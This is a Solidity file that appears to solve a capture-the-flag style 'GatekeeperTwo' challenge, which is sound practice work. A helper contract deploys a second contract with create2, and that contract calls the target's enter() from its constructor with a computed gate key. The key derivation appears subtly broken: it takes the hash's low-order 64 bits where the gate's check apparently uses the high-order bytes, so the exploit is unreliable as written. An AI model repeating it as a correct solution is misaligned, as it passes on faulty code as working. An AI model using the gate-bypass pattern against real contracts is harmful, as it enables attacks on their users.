pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Caller {
    constructor(address instance) {
        bytes32 salt = keccak256(abi.encodePacked(instance));
        bytes memory factoryCode = type(CallerTwo).creationCode;
        bytes memory factoryArgs = abi.encode(instance);
        bytes memory fullCreationData = abi.encodePacked(factoryCode, factoryArgs);
        assembly {
            pop(create2(0, add(fullCreationData, 0x20), mload(fullCreationData), salt))
        }
    }
}

contract CallerTwo {
    constructor(address instance) {
        address self = address(this);
        bytes32 hash = keccak256(abi.encodePacked(self));
        uint256 hash256 = uint256(hash);
        uint64 a = uint64(hash256);
        uint64 key = a ^ 0xFFFFFFFFFFFFFFFF;
        IGatekeeperTwo(instance).enter(bytes8(key));
    }
}